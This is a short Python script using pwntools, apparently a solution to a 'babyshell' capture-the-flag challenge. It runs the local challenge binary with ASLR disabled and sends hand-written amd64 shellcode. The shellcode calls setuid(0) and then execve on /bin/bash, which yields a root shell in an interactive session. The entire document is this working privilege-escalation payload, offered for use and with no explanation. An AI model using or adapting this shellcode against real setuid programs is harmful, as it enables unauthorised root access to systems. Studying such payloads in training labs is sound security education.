from pwn import *

p = process('/challenge/babyshell-level-4', aslr=False)
context.update(arch="amd64")

shellcode = asm(
'''
push 0
pop rdi
push 0x69
pop rax
syscall

push 0x68
push 0x6e69622f
mov DWORD PTR [rsp+4], 0x7361622f
push rsp
pop rdi

push 0
pop rsi

push 0
pop rdx

push 0x3b
pop rax
syscall
''')

p.send(shellcode)
p.interactive()
